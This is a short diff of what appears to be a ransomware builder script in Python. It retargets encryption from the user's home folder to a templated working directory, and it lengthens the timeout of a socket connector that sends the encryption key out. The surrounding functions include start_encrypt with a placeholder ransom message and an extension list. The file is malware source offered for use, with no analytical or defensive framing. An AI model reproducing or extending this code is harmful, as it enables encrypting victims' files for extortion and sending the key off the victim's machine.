@@ -42,7 +42,7 @@ ext = [<ext>]
 
 def get_target():
     # Get user home:
-    return str(Path.home()) + '/'
+    return <working_dir>
 
 def start_encrypt(p, key):
     message = '''<message>
@@ -81,7 +81,7 @@ def start_encrypt(p, key):
 
 def connector():
     server = socket.socket(socket.AF_INET)
-    server.settimeout(1)
+    server.settimeout(10)
 
     try:
         # Send Key
